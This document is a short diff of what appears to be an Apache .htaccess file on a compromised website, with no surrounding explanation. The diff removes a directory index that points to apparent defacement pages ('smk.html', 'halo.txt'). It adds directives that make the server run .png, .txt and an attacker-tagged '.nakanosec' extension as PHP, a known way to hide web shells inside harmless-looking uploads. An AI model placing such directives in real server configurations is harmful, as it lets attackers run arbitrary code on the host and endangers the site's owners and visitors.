@@ -1,1 +1,6 @@
-DirectoryIndex smk.html halo.txt
+AddType application/x-httpd-php .png 
+AddType application/x-httpd-php .txt 
+AddType application/x-httpd-php .php
+AddType application/x-httpd-php .nakanosec
+
+
